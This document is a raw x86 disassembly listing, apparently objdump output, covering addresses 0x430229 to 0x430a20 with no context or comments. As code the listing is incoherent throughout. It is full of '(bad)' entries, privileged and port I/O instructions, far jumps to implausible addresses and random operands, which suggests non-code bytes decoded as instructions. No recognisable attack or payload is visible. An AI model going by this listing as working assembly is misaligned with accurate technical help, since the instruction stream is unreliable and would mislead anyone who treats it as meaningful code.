  430229:	fwait
  43022a:	mov    esi,DWORD PTR [edx-0xc]
  43022d:	xor    al,bl
  43022f:	add    BYTE PTR [ebx+0x3c83203],bl
  430235:	mov    DWORD PTR [ecx+0x45c4084d],ecx
  43023b:	mov    eax,DWORD PTR [ebx-0xb87b3]
  430241:	xor    eax,DWORD PTR [eax]
  430243:	retf   
  430244:	ret    
  430245:	add    eax,esi
  430247:	enter  0x8945,0x64
  43024b:	dec    ebp
  43024c:	sbb    ah,cl
  43024e:	add    BYTE PTR [ebx-0xb87b277],cl
  430254:	dec    DWORD PTR [ebx-0xbcfb275]
  43025a:	test   DWORD PTR [ebx],esi
  43025c:	dec    ebx
  43025e:	inc    DWORD PTR [ebx]
  430260:	inc    eax
  430261:	enter  0x8989,0x64
  430265:	(bad)  
  430266:	jmp    FWORD PTR [ebx+ecx*4-0x1]
  43026a:	cld    
  43026b:	dec    DWORD PTR [ebp-0xa90001]
  430271:	push   edi
  430272:	mov    BYTE PTR [edx+0x1],ch
  430275:	and    DWORD PTR [eax],eax
  430277:	pop    ecx
  430278:	inc    ebp
  430279:	mov    DWORD PTR [ebp-0xb28ff8],ecx
  43027f:	push   0xffffff89
  430281:	pop    ecx
  430282:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430283:	dec    ebp
  430284:	add    BYTE PTR [ecx+0x45fc088b],cl
  43028a:	jne    0x4302d5
  43028c:	lea    eax,[eax]
  43028e:	fs (bad) 
  430290:	dec    DWORD PTR [eax]
  430292:	mov    DWORD PTR [eax],eax
  430294:	test   al,0x0
  430296:	add    BYTE PTR [ebp-0x18],cl
  430299:	xor    ebp,DWORD PTR [edx]
  43029b:	add    eax,DWORD PTR [eax]
  43029d:	mov    eax,eax
  43029f:	or     BYTE PTR [ebp+ecx*2+0x3003302],al
  4302a6:	inc    ebp
  4302a7:	mov    DWORD PTR [ebx+0x459408],ecx
  4302ad:	bound  ecx,QWORD PTR [ebx-0x372749b]
  4302b3:	inc    eax
  4302b4:	cmp    bh,0x1
  4302b7:	lea    eax,[eax]
  4302b9:	and    BYTE PTR [eax],al
  4302bb:	inc    DWORD PTR [ecx-0x18]
  4302be:	mov    ecx,DWORD PTR [ebx]
  4302c0:	cld    
  4302c1:	add    BYTE PTR [ecx+0x75014d],cl
  4302c7:	(bad)  
  4302c8:	xchg   ebp,eax
  4302c9:	sar    bh,1
  4302cb:	inc    eax
  4302cc:	inc    DWORD PTR [eax]
  4302ce:	mov    eax,DWORD PTR [ebp-0x4]
  4302d1:	xor    edx,DWORD PTR [edx+0x7201be]
  4302d7:	add    BYTE PTR [edx],dl
  4302d9:	(bad)  
  4302da:	nop
  4302db:	inc    ebp
  4302dc:	add    BYTE PTR [ebx-0x5afb0c00],cl
  4302e2:	mov    al,0xff
  4302e4:	add    bh,bh
  4302e6:	add    BYTE PTR [ebx],dh
  4302e8:	inc    DWORD PTR [ebx]
  4302ea:	sbb    al,0x89
  4302ec:	jne    0x4302ca
  4302ee:	mov    esp,DWORD PTR [ecx+0x4500fc]
  4302f4:	mov    eax,DWORD PTR [ebp-0xff0048]
  4302fa:	mov    DWORD PTR [eax-0x70],0xec70ed89
  430301:	inc    DWORD PTR [ebp-0x75]
  430304:	fisttp QWORD PTR [esi+ebp*8]
  430307:	test   DWORD PTR [esi-0x1],esp
  43030a:	inc    ebp
  43030b:	(bad)  
  43030c:	aas    
  43030d:	inc    ebp
  43030e:	(bad)  
  43030f:	lea    edi,[eax+edi*2-0x1]
  430313:	inc    edi
  430315:	mov    DWORD PTR ds:0x8000c7a0,edi
  43031b:	mov    ebp,esp
  43031d:	cld    
  43031e:	loop   0x4302ad
  430320:	inc    ebp
  430321:	(bad)  
  430322:	out    dx,al
  430323:	(bad)  
  430324:	fisttp WORD PTR [eax+0x8801c7]
  43032a:	jecxz  0x430371
  43032c:	in     al,dx
  43032d:	inc    DWORD PTR [ebp-0x4]
  430330:	out    0x8d,eax
  430332:	aas    
  430333:	(bad)  
  430334:	call   0xcb2e38
  430339:	add    DWORD PTR [ebx-0x7f490400],ecx
  43033f:	add    BYTE PTR [ecx],al
  430341:	test   DWORD PTR [eax],eax
  430343:	wrmsr  
  430345:	ja     0x430342
  430347:	add    BYTE PTR [eax],al
  430349:	mov    eax,DWORD PTR [ebp-0x747f8a04]
  43034f:	add    esp,edi
  430351:	add    BYTE PTR [eax+0x450108],al
  430357:	mov    edi,DWORD PTR [ebp-0x6c]
  43035a:	add    DWORD PTR [eax],0x4
  43035d:	mov    eax,DWORD PTR [ebp+0x3]
  430360:	mov    edi,DWORD PTR [esp+edi*8]
  430363:	dec    ebp
  430364:	nop
  430365:	mov    eax,DWORD PTR [ecx]
  430367:	fadd   DWORD PTR [eax]
  430369:	add    BYTE PTR [ecx*4-0xafa000],dl
  430370:	inc    ebp
  430371:	push   edx
  430372:	call   DWORD PTR [ebp-0x7b]
  430375:	mov    esi,DWORD PTR [ebp-0x74]
  430378:	mov    eax,DWORD PTR [eax]
  43037a:	cld    
  43037b:	mov    eax,DWORD PTR [eax+0x880103]
  430381:	add    BYTE PTR [ebp+0x6a],bh
  430384:	cmp    edi,0x10
  430387:	mov    WORD PTR [ebp+0x0],es
  43038a:	mov    edx,DWORD PTR [edx-0x4]
  43038d:	push   ecx
  43038e:	nop
  43038f:	inc    DWORD PTR [ecx]
  430391:	cld    
  430392:	add    BYTE PTR [ebp-0x16],bh
  430395:	mov    eax,DWORD PTR [eax]
  430397:	cld    
  430398:	push   eax
  430399:	nop
  43039a:	inc    ebp
  43039b:	add    edi,edi
  43039d:	add    BYTE PTR [ebx+0x4de2f445],cl
  4303a3:	jmp    0xe33b:0x9403c733
  4303aa:	movntq QWORD PTR [edx],mm7
  4303ad:	mov    DWORD PTR [eax],0xb87e8b98
  4303b3:	test   ebx,eax
  4303b5:	jmp    DWORD PTR [ebp-0x1]
  4303b8:	int    0xed
  4303ba:	sub    esp,esi
  4303bc:	add    eax,DWORD PTR [ebp-0x30]
  4303bf:	fild   WORD PTR [ebp+0x3f]
  4303c2:	cmp    eax,edi
  4303c4:	je     0xc043e9ea
  4303ca:	mov    DWORD PTR [ebp-0x28],0xdb00eb
  4303d1:	(bad)  
  4303d2:	jne    0x430360
  4303d4:	mov    ebx,ebp
  4303d6:	cld    
  4303d7:	jle    0x43041e
  4303d9:	dec    ecx
  4303da:	mov    eax,DWORD PTR [eax]
  4303dc:	mov    ah,0x50
  4303de:	add    BYTE PTR [ebp-0x18],al
  4303e1:	mov    ebp,DWORD PTR [ecx]
  4303e3:	test   al,0x0
  4303e5:	add    BYTE PTR [ebx-0x7f170301],cl
  4303eb:	add    DWORD PTR es:[eax],eax
  4303ee:	add    al,al
  4303f0:	xor    BYTE PTR [eax+0x4f],dl
  4303f3:	inc    ebp
  4303f4:	add    BYTE PTR [ebx+0xfcd88b],cl
  4303fa:	mov    DWORD PTR [ebx-0x3fff03ff],ecx
  430400:	add    DWORD PTR [ecx+0x458be845],ecx
  430406:	fmul   DWORD PTR [ebx+0x8bb800]
  43040c:	cld    
  43040d:	call   0xd82ed2
  430412:	dec    DWORD PTR [ebx+0x109ee8ff]
  430418:	add    al,al
  43041a:	push   eax
  43041b:	es inc ebp
  43041d:	inc    ebp
  43041e:	mov    ecx,DWORD PTR [ebx+0xd89c]
  430424:	dec    DWORD PTR [ebx-0x3ff70301]
  43042a:	mov    DWORD PTR gs:[eax],eax
  43042d:	call   0x8c134967
  430432:	sar    BYTE PTR [eax-0x17baffd8],0x8b
  430439:	sub    eax,ebx
  43043b:	add    BYTE PTR [eax],al
  43043d:	mov    ecx,DWORD PTR [ebx-0x3fef0318]
  430443:	inc    ebp
  430444:	push   ebp
  430445:	mov    ebp,eax
  430447:	shr    BYTE PTR [ecx],1
  430449:	ret    
  43044a:	add    dh,al
  43044c:	mov    eax,ecx
  43044e:	cld    
  43044f:	test   BYTE PTR [eax+0x101],al
  430455:	inc    ebp
  430456:	xor    BYTE PTR [ebx],dh
  430458:	push   edi
  430459:	mov    ecx,0xffe48d89
  43045e:	inc    ebp
  43045f:	enter  0x4d8b,0xfc
  430463:	mov    eax,ebx
  430465:	or     BYTE PTR [ebx+0x38732c1],bl
  43046b:	add    DWORD PTR [ebp-0xbac000],ecx
  430471:	add    al,ch
  430473:	add    BYTE PTR [ecx],ch
  430475:	inc    DWORD PTR [eax]
  430477:	cld    
  430478:	mov    edi,DWORD PTR [ebp-0xc]
  43047b:	mov    esi,DWORD PTR [ebp-0x4]
  43047e:	xor    edx,DWORD PTR [eax+0x8d0103]
  430484:	and    BYTE PTR [ebp+0x50e800ff],bl
  43048a:	sub    DWORD PTR [ebp+0x0],eax
  43048d:	mov    edi,edi
  43048f:	test   al,0xe4
  430491:	add    BYTE PTR [ebp-0x1],cl
  430494:	xor    ebp,eax
  430496:	add    esp,DWORD PTR [esi]
  430498:	cmp    eax,DWORD PTR [eax]
  43049a:	jne    0x4304e9
  43049c:	(bad)  
  43049d:	mov    ebx,eax
  43049f:	pushf  
  4304a0:	add    BYTE PTR [eax],al
  4304a2:	add    BYTE PTR [ecx-0x37474bb],cl
  4304a8:	or     BYTE PTR [eax+0x8401c3],bh
  4304ae:	fwait
  4304af:	jne    0x4304e3
  4304b1:	xor    ecx,DWORD PTR [ecx+0x457c088d]
  4304b7:	inc    DWORD PTR [ebp-0x74d68b18]
  4304bd:	add    BYTE PTR [eax+0x33fc4d8b],bh
  4304c3:	or     BYTE PTR [ebp+0x72000801],0x30
  4304ca:	add    BYTE PTR [edi+0x45],dl
  4304cd:	or     DWORD PTR [ebx-0x3c95471c],0xffffffff
  4304d4:	gs test ebp,ecx
  4304d7:	je     0x430504
  4304d9:	mov    eax,DWORD PTR [ebx]
  4304db:	cld    
  4304dc:	sar    BYTE PTR [eax+0x3b0145],1
  4304e2:	pcmpeqw mm4,mm2
  4304e5:	xor    edi,edi
  4304e7:	lea    ecx,[ebx-0x23927470]
  4304ed:	add    BYTE PTR [ebp+0x50],cl
  4304f0:	cmp    eax,DWORD PTR [ebp+0x75]
  4304f3:	mov    ebp,DWORD PTR [eax-0x68]
  4304f6:	test   DWORD PTR [eax],eax
  4304f8:	clc    
  4304f9:	push   DWORD PTR [ebp-0x1]
  4304fc:	lea    ecx,[eax]
  4304fe:	int3   
  4304ff:	inc    ebp
  430500:	call   0xfb3690
  430505:	jne    0x4304ff
  430507:	xor    edi,DWORD PTR [ebp-0x41]
  43050a:	jmp    0x43057e
  43050c:	mov    eax,DWORD PTR [eax]
  43050e:	mov    eax,0x339545c7
  430513:	inc    DWORD PTR [ebx]
  430515:	push   DWORD PTR [ecx]
  430517:	inc    ecx
  430518:	mov    eax,DWORD PTR [eax]
  43051a:	jmp    0x43056c
  43051c:	mov    eax,DWORD PTR [ebp-0x3c]
  43051f:	mov    eax,eax
  430521:	cld    
  430522:	clc    
  430523:	ret    
  430524:	test   bh,al
  430526:	pop    es
  430527:	xchg   ebp,eax
  430528:	add    bh,bh
  43052a:	inc    ebp
  43052b:	dec    DWORD PTR [edi]
  43052d:	sub    ebp,DWORD PTR [ebx]
  43052f:	add    BYTE PTR [eax],al
  430531:	push   eax
  430532:	jbe    0x430589
  430534:	mov    cl,BYTE PTR [ebx-0x34e00b80]
  43053a:	or     al,0xcf
  43053c:	inc    eax
  43053d:	enter  0x745,0x72
  430541:	inc    ebp
  430542:	mov    eax,DWORD PTR [ecx]
  430544:	int3   
  430545:	add    BYTE PTR [ebp-0x75],al
  430548:	xor    DWORD PTR [eax+0x33c74d9c],edi
  43054e:	ror    BYTE PTR [ebp+0x72f80885],1
  430554:	inc    ebp
  430555:	add    BYTE PTR [ebx-0x3c7423bb],cl
  43055b:	fadd   st,st(6)
  43055d:	rol    BYTE PTR [ebp+0x12],0x8b
  430561:	inc    ebp
  430562:	fmul   QWORD PTR [ebx-0x3c39233d]
  430568:	inc    ebp
  430569:	test   bh,al
  43056b:	fwait
  43056c:	clc    
  43056d:	xor    al,BYTE PTR [ebp+0x45dcf889]
  430573:	inc    ebp
  430574:	xor    esi,DWORD PTR [ebx]
  430576:	pushf  
  430577:	mov    ecx,0xffb48dc7
  43057c:	test   eax,ecx
  43057e:	clc    
  43057f:	dec    ebp
  430580:	inc    ebp
  430581:	mov    edi,DWORD PTR ds:0xc7c19c08
  430587:	xchg   BYTE PTR [esi+edi*8-0x807007b],ah
  43058e:	inc    ebp
  43058f:	inc    ebp
  430590:	aas    
  430591:	mov    ebx,DWORD PTR [eax+ecx*1+0x18e8c8c7]
  430598:	test   DWORD PTR [ecx],esi
  43059a:	clc    
  43059b:	pushf  
  43059c:	inc    ebp
  43059d:	dec    DWORD PTR [ebx-0x3cba0f04]
  4305a3:	push   eax
  4305a4:	mov    BYTE PTR [edx],0x7d
  4305a7:	add    BYTE PTR [ebx],bh
  4305a9:	mov    ecx,DWORD PTR [edi]
  4305ab:	mov    DWORD PTR [eax],ebx
  4305ad:	les    eax,FWORD PTR [eax]
  4305af:	adc    ebp,ecx
  4305b1:	dec    ebp
  4305b2:	add    DWORD PTR [ebx-0x34ba3c00],ecx
  4305b8:	mov    ecx,esi
  4305ba:	lock or al,cl
  4305bd:	clc    
  4305be:	inc    ebp
  4305bf:	add    esi,DWORD PTR [ebx]
  4305c1:	jge    0x4305c6
  4305c3:	xor    edi,DWORD PTR [ebx]
  4305c5:	cmp    ecx,DWORD PTR [edi]
  4305c7:	paddb  mm1,QWORD PTR [eax+eax*1+0x0]
  4305cc:	mov    edi,DWORD PTR [ecx]
  4305ce:	test   al,0xcc
  4305d0:	dec    ebp
  4305d1:	test   BYTE PTR [ebx],dh
  4305d3:	pop    es
  4305d4:	xor    eax,DWORD PTR [eax]
  4305d6:	add    ecx,DWORD PTR [esi]
  4305d8:	add    ecx,eax
  4305da:	psraw  mm0,mm1
  4305dd:	sub    BYTE PTR [ebp+0x38],cl
  4305e0:	mov    edi,DWORD PTR [ebx]
  4305e2:	lock int3 
  4305e4:	shl    edx,1
  4305e6:	rol    BYTE PTR [ebp+0xc],1
  4305e9:	mov    DWORD PTR [ebp-0x24],0xf8038533
  4305f0:	jmp    0x75063a
  4305f5:	pushf  
  4305f6:	inc    ebp
  4305f7:	mov    DWORD PTR [ebx-0x3cba0710],ecx
  4305fd:	xor    ecx,ebx
  4305ff:	add    ecx,esi
  430601:	mov    esi,eax
  430603:	enter  0x45af,0x8b
  430607:	xor    ecx,eax
  430609:	add    edx,DWORD PTR [ebp-0x77]
  43060c:	sub    ecx,DWORD PTR [eax]
  43060e:	cmp    eax,DWORD PTR [ebp+0x77]
  430611:	ror    DWORD PTR [ebx-0x76385764],1
  430617:	test   al,0x0
  430619:	test   DWORD PTR [ebx+0x4d45acf8],ecx
  43061f:	cmp    al,0x33
  430621:	pushf  
  430622:	xor    eax,edi
  430624:	add    ebp,DWORD PTR [ebx+eax*1-0x3e07f07b]
  43062b:	inc    ebp
  43062c:	dec    ebp
  43062d:	mov    ebx,DWORD PTR ds:[eax+esi*8-0x2f432e39]
  430635:	test   DWORD PTR ds:0xeb4545f8,eax
  43063b:	cmp    BYTE PTR [ebx+0x4d8ba49c],cl
  430641:	fdiv   QWORD PTR [ebx]
  430643:	dec    ebp
  430644:	xor    esi,DWORD PTR [ebx]
  430646:	add    eax,DWORD PTR [ebx]
  430648:	add    ecx,DWORD PTR [ecx-0x373e4ff1]
  43064e:	dec    ebp
  43064f:	test   BYTE PTR [ebx-0x2eff0ffe],cl
  430655:	out    dx,eax
  430656:	rol    BYTE PTR [eax],1
  430658:	add    eax,0xebc8458b
  43065d:	dec    ebp
  43065e:	mov    ebp,DWORD PTR [ebx]
  430660:	mov    esp,0x33f84d8b
  430665:	ret    
  430666:	xor    eax,esi
  430668:	add    ecx,eax
  43066a:	add    eax,DWORD PTR [edx+0xc1010f]
  430670:	dec    ebp
  430671:	inc    ebp
  430672:	mov    ecx,DWORD PTR [ebx-0x3c2e0710]
  430678:	ror    bl,1
  43067a:	add    eax,0xebc645ce
  43067f:	scas   eax,DWORD PTR es:[edi]
  430680:	mov    ecx,DWORD PTR [ebx+0x554dc8e8]
  430686:	xor    ebp,DWORD PTR [ebx]
  430688:	xor    edi,DWORD PTR [ebx]
  43068a:	add    esi,DWORD PTR [edi+0x3]
  43068d:	mov    ecx,DWORD PTR [edi]
  43068f:	clc    
  430690:	rol    ebx,0x4d
  430693:	(bad)  
  430694:	mov    edi,DWORD PTR [eax+esi*8-0x2f742f00]
  43069b:	mov    ah,0x45
  43069d:	dec    ebp
  43069e:	jbe    0x4306d3
  4306a0:	mov    esi,DWORD PTR [ebx]
  4306a2:	call   0x334653aa
  4306a7:	rdpmc  
  4306a9:	rol    DWORD PTR [ebx],0x4d
  4306ac:	add    ecx,DWORD PTR [ebx-0x2e3e0ff1]
  4306b2:	inc    ebp
  4306b3:	ror    BYTE PTR [ebx+0x45450808],1
  4306b9:	jmp    0x10b0749
  4306be:	inc    ebp
  4306bf:	inc    ebp
  4306c0:	(bad)  
  4306c1:	mov    ebx,eax
  4306c3:	clc    
  4306c4:	test   ebx,eax
  4306c6:	clc    
  4306c7:	retf   
  4306c8:	inc    ebp
  4306c9:	into   
  4306ca:	mov    esi,0x8b85afec
  4306d0:	clc    
  4306d1:	enter  0x5545,0x33
  4306d5:	sub    ebx,DWORD PTR [ebx+edi*1-0x74278875]
  4306dc:	ret    
  4306dd:	mov    ah,0xc6
  4306df:	addr16 push 0x338b4545
  4306e5:	clc    
  4306e6:	add    eax,ebx
  4306e8:	loopne 0x4306b5
  4306ea:	dec    ebp
  4306eb:	into   
  4306ec:	mov    al,dh
  4306ee:	or     BYTE PTR [edi-0x37ff748e],ch
  4306f4:	inc    ebp
  4306f5:	push   ebp
  4306f6:	mov    ebp,DWORD PTR [ebx]
  4306f8:	in     al,dx
  4306f9:	cmp    eax,ebx
  4306fb:	ja     0x430742
  4306fd:	mov    ecx,DWORD PTR [ebx-0x7bba2354]
  430703:	inc    ebp
  430704:	fwait
  430705:	mov    esi,DWORD PTR [edx]
  430707:	clc    
  430708:	mov    bl,al
  43070a:	xlat   BYTE PTR ds:[ebx]
  43070b:	retf   
  43070c:	inc    ebp
  43070d:	into   
  43070e:	mov    eax,esi
  430710:	in     al,dx
  430711:	scas   eax,DWORD PTR es:[edi]
  430712:	retf   
  430713:	mov    ecx,DWORD PTR [ebp-0x38]
  430716:	mov    edx,DWORD PTR [ebp-0x24]
  430719:	sub    eax,DWORD PTR [ebx+edi*1-0x74cd8865]
  430720:	mov    ah,BYTE PTR [edi+edx*8+0x33454d23]
  430727:	mov    eax,DWORD PTR [ebx]
  430729:	clc    
  43072a:	loopne 0x4306ef
  43072c:	push   ebp
  43072d:	retf   
  43072e:	mov    dh,al
  430730:	adc    esi,ecx
  430732:	jb     0x4306e3
  430734:	add    BYTE PTR [ebx+0x558bc845],cl
  43073a:	in     al,dx
  43073b:	sub    eax,ebx
  43073d:	cmp    ecx,ebx
  43073f:	mov    eax,esi
  430741:	mov    esp,0x45af03ce
  430746:	add    ecx,DWORD PTR [ebx-0x34ba0720]
  43074c:	mov    eax,ebx
  43074e:	in     al,dx
  43074f:	into   
  430750:	dec    ebp
  430751:	(bad)  
  430752:	xor    ebp,DWORD PTR [edi+0x80f8903]
  430758:	rol    DWORD PTR [ebp+0x4d],0x89
  43075c:	xor    esp,esp
  43075e:	sub    eax,DWORD PTR [ebp-0x75]
  430761:	add    ebp,esp
  430763:	mov    al,0x55
  430765:	inc    ebp
  430766:	xor    esi,DWORD PTR [ecx]
  430768:	add    ebx,DWORD PTR [edi+ecx*1+0x55dcca89]
  43076f:	inc    ebp
  430770:	xor    esi,DWORD PTR [edx]
  430772:	sub    ebx,DWORD PTR [ebp+ecx*4+0x72c011c7]
  430779:	test   DWORD PTR [eax],eax
  43077b:	clc    
  43077c:	enter  0x8645,0x33
  430780:	inc    DWORD PTR [ebx]
  430782:	(bad)  
  430783:	jmp    0x4307ca
  430785:	mov    ecx,DWORD PTR [ebx-0x3c3c1b28]
  43078b:	inc    ebp
  43078c:	(bad)  
  43078d:	mov    ebp,DWORD PTR [edi-0x277b7424]
  430793:	fwait
  430794:	retf   
  430795:	xor    al,cl
  430797:	mov    BYTE PTR [ebp+0xb],cl
  43079a:	lea    eax,[ebp+0x8]
  43079d:	xor    esi,DWORD PTR [edx+0x3]
  4307a0:	add    al,ah
  4307a2:	inc    ebp
  4307a3:	dec    ebp
  4307a4:	mov    ecx,DWORD PTR [edx+0x72c308d0]
  4307aa:	gs add ch,cl
  4307ad:	inc    ebp
  4307ae:	sub    ecx,DWORD PTR [edx+0x4df00b03]
  4307b4:	inc    ebp
  4307b5:	xor    ecx,DWORD PTR [ebx-0x3c1f37fd]
  4307bb:	push   ebp
  4307bc:	(bad)  
  4307bd:	mov    BYTE PTR [edi+0xf723b11],ch
  4307c3:	add    ch,ch
  4307c5:	inc    ebp
  4307c6:	dec    DWORD PTR [ebx-0x34332775]
  4307cc:	add    al,0x4d
  4307ce:	inc    ebp
  4307cf:	mov    ecx,DWORD PTR [ebx-0x7f7b0324]
  4307d5:	fwait
  4307d6:	add    DWORD PTR [edx],esi
  4307d8:	add    BYTE PTR [ebx+0x4d00c000],cl
  4307de:	push   DWORD PTR [ebx]
  4307e0:	int3   
  4307e1:	xor    eax,DWORD PTR [eax]
  4307e3:	add    edx,DWORD PTR [eax+0x3]
  4307e6:	mov    DWORD PTR [edi],ecx
  4307e8:	call   0x4288c8ae
  4307ed:	mov    DWORD PTR [ebp-0x20],esp
  4307f0:	add    BYTE PTR [ebp+0x7d],al
  4307f3:	mov    eax,DWORD PTR [eax]
  4307f5:	in     al,0x15
  4307f7:	ret    
  4307f8:	iret   
  4307f9:	(bad)  
  4307fa:	enter  0x14af,0x8b
  4307fe:	(bad)  
  4307ff:	in     al,dx
  430800:	or     bl,cl
  430802:	adc    cl,al
  430804:	push   ebp
  430805:	dec    ebp
  430806:	inc    eax
  430807:	mov    edx,DWORD PTR [ebp-0x20]
  43080a:	jb     0x4307d7
  43080c:	mov    ecx,esi
  43080e:	cld    
  43080f:	scas   eax,DWORD PTR es:[edi]
  430810:	or     BYTE PTR [ebx-0x2cff27ff],0x0
  430817:	mov    BYTE PTR [eax],0x8c
  43081a:	push   0xffffff9b
  43081c:	push   edi
  43081d:	xor    dl,BYTE PTR [eax+0x3b]
  430820:	mov    ecx,DWORD PTR [edi]
  430822:	call   0x8c424d85
  430827:	mov    eax,eax
  430829:	in     al,dx
  43082a:	jge    0x430879
  43082c:	mov    DWORD PTR [ebx],esi
  43082e:	int3   
  43082f:	add    eax,DWORD PTR [ebp+0xf]
  430832:	xor    eax,ecx
  430834:	(bad)  
  430835:	dec    ebp
  430836:	pushf  
  430837:	xor    ecx,esi
  430839:	add    edi,DWORD PTR [edi]
  43083b:	mov    eax,DWORD PTR [ebp-0x38]
  43083e:	(bad)  
  43083f:	test   dh,dl
  430841:	fwait
  430842:	add    esi,DWORD PTR [edx]
  430844:	jmp    0x4307cf
  430846:	mov    cl,al
  430848:	add    eax,0x14330f45
  43084d:	mov    ecx,0xff468d80
  430852:	jmp    0xc990181f
  430857:	mov    edx,ecx
  430859:	rol    BYTE PTR [ebp+0x330155],1
  43085f:	add    ecx,DWORD PTR [ebp+0xf]
  430862:	xor    eax,edx
  430864:	(bad)  
  430865:	ror    DWORD PTR [eax],0x86
  430868:	jb     0x430867
  43086a:	add    bh,bh
  43086c:	clc    
  43086d:	inc    ebp
  43086e:	jb     0x4308da
  430870:	mov    ecx,DWORD PTR [ecx+0x4545c008]
  430876:	xor    DWORD PTR [ebx+0xc7d89c],ecx
  43087c:	shr    BYTE PTR [eax-0x3d],0x30
  430880:	clc    
  430881:	add    BYTE PTR [ebp+0x75],al
  430884:	xor    DWORD PTR [edx-0x64],ebp
  430887:	inc    edi
  430889:	adc    al,0xe8
  43088b:	inc    ebp
  43088c:	test   DWORD PTR [ebp-0x7cba8b08],eax
  430892:	mov    ecx,DWORD PTR [eax]
  430894:	cld    
  430895:	or     DWORD PTR [ebp-0x34],0x33
  430899:	jbe    0x43089e
  43089b:	mov    edx,DWORD PTR [ecx+0x2b]
  43089e:	dec    ebp
  43089f:	mov    cl,BYTE PTR [ebx+0x45d801]
  4308a5:	mov    BYTE PTR [ebx],dh
  4308a7:	mov    eax,DWORD PTR [ebx]
  4308a9:	or     BYTE PTR [ecx+0x3b],dl
  4308ac:	dec    ebp
  4308ad:	int3   
  4308ae:	xor    ebp,edi
  4308b0:	add    eax,DWORD PTR [ebp+0x51]
  4308b3:	mov    ecx,DWORD PTR [ebp-0x28]
  4308b6:	xor    eax,DWORD PTR [eax]
  4308b8:	add    ebp,DWORD PTR [eax+0x51]
  4308bb:	adc    BYTE PTR [eax+0x0],0x8b
  4308bf:	add    BYTE PTR [ebx+0x4d18fcff],cl
  4308c5:	inc    ebp
  4308c6:	mov    ecx,DWORD PTR [ecx+0x4500c4d8]
  4308cc:	xor    ecx,DWORD PTR [ebx+0x4551c403]
  4308d2:	dec    ebp
  4308d3:	mov    esi,DWORD PTR [ebx]
  4308d5:	hlt    
  4308d6:	add    eax,ebx
  4308d8:	push   ecx
  4308d9:	inc    ebp
  4308da:	dec    ebp
  4308db:	(bad)  
  4308dc:	call   esi
  4308de:	in     al,0xc7
  4308e0:	retf   
  4308e1:	mov    al,ds:0xc5ff3dce
  4308e6:	adc    al,0xc6
  4308e8:	inc    ebp
  4308e9:	and    eax,0x9c0f4c85
  4308ee:	cmp    DWORD PTR [esi-0xe7ac800],0xf
  4308f5:	cmp    BYTE PTR [ebx+0x38],0x0
  4308f9:	mov    dh,0xc7
  4308fb:	cmp    eax,eax
  4308fd:	jne    0x45440149
  430903:	mov    esi,DWORD PTR [ebx]
  430905:	mov    eax,0x848bcb9c
  43090a:	rcr    BYTE PTR [ebx-0x7c7fcd0f],0x65
  430911:	or     BYTE PTR [edi],cl
  430913:	(bad)  
  430914:	dec    ebp
  430915:	inc    edi
  430916:	add    bh,0x54
  430919:	or     cl,ch
  43091b:	test   DWORD PTR [eax+0x4d4501f8],ecx
  430921:	add    BYTE PTR [eax-0x1638ab64],0xbc
  430928:	mov    BYTE PTR [ebp+0x45a5f802],dh
  43092e:	(bad)  
  43092f:	cmp    eax,0x89839cff
  430934:	je     0x43091a
  430936:	inc    DWORD PTR [ebp+0x0]
  430939:	mov    ecx,DWORD PTR [ebp-0x340018]
  43093f:	into   
  430940:	dec    DWORD PTR [ebx-0x7f72431c]
  430946:	push   0x5000ff01
  43094b:	retf   
  43094c:	inc    ebp
  43094d:	into   
  43094e:	dec    DWORD PTR [ebx-0x343f3ff4]
  430954:	push   eax
  430955:	into   
  430956:	call   0x4b0de6
  43095b:	retf   
  43095c:	add    dh,cl
  43095e:	add    bh,bh
  430960:	mov    DWORD PTR [eax+ecx*1],edx
  430963:	clc    
  430964:	inc    ebp
  430965:	inc    ebp
  430966:	mov    ecx,DWORD PTR [ebx-0x7fff1728]
  43096c:	push   0x1
  43096e:	push   edi
  43096f:	add    BYTE PTR [eax-0x35],dl
  430972:	mov    ecx,esi
  430974:	cld    
  430975:	mov    ecx,DWORD PTR [ecx+0xcb01bc]
  43097b:	into   
  43097c:	ror    BYTE PTR [ebx+0x75000800],0x50
  430983:	xor    eax,DWORD PTR [ebp+0x3]
  430986:	jne    0x4309d9
  430988:	call   DWORD PTR [eax-0x3c]
  43098b:	mov    DWORD PTR [ecx-0x18],edx
  43098e:	mov    edi,edi
  430990:	call   0x8b464f19
  430995:	add    ah,ah
  430997:	rol    BYTE PTR [ebp-0x7c],0xeb
  43099b:	add    edi,edi
  43099d:	add    al,ch
  43099f:	inc    ebp
  4309a0:	push   ecx
  4309a1:	cmp    al,0x8b
  4309a3:	pushf  
  4309a4:	(bad)  
  4309a5:	mov    DWORD PTR [ebp-0x50],0xf8e485c7
  4309ac:	test   DWORD PTR [ebp-0x8],ecx
  4309af:	add    BYTE PTR [ebp+0x54],0x32
  4309b3:	jmp    0x8bcc9254
  4309b8:	in     al,dx
  4309b9:	or     BYTE PTR [ebp-0xf],al
  4309bc:	xor    eax,DWORD PTR [eax+0x4f896503]
  4309c2:	hlt    
  4309c3:	mov    eax,DWORD PTR [ebp-0x50]
  4309c6:	xor    esi,ecx
  4309c8:	add    eax,DWORD PTR [eax+0x4f086589]
  4309ce:	inc    ebp
  4309cf:	adc    ecx,0x68
  4309d2:	pushf  
  4309d3:	inc    edi
  4309d5:	add    al,ch
  4309d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4309d8:	test   edi,edi
  4309da:	clc    
  4309db:	inc    DWORD PTR [ebp-0x73]
  4309de:	cmp    al,0x74
  4309e0:	pushf  
  4309e1:	inc    edi
  4309e3:	push   ecx
  4309e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4309e5:	jne    0x43096c
  4309e7:	push   eax
  4309e8:	clc    
  4309e9:	test   DWORD PTR [ebp-0x1],eax
  4309ec:	call   FWORD PTR ds:[ebx+ecx*4+0x70b4c4c7]
  4309f4:	test   DWORD PTR [ebx+0x574510f8],eax
  4309fa:	cmp    BYTE PTR [edx],bl
  4309fc:	pushf  
  4309fd:	add    BYTE PTR [ebx+0x4d80e468],cl
  430a03:	add    BYTE PTR [ebx],dh
  430a05:	inc    ebp
  430a06:	add    ecx,DWORD PTR [ebx-0x7f3f0377]
  430a0c:	enter  0x8401,0x0
  430a10:	add    al,BYTE PTR [eax]
  430a12:	add    bh,bh
  430a14:	out    dx,eax
  430a15:	sbb    BYTE PTR [eax],al
  430a17:	dec    ebp
  430a18:	mov    ecx,DWORD PTR [ebx+0x4dd8f4]
  430a1e:	sub    esi,DWORD PTR [ebx]
  430a20:	mov    ebp,DWORD PTR [eax-0x8]
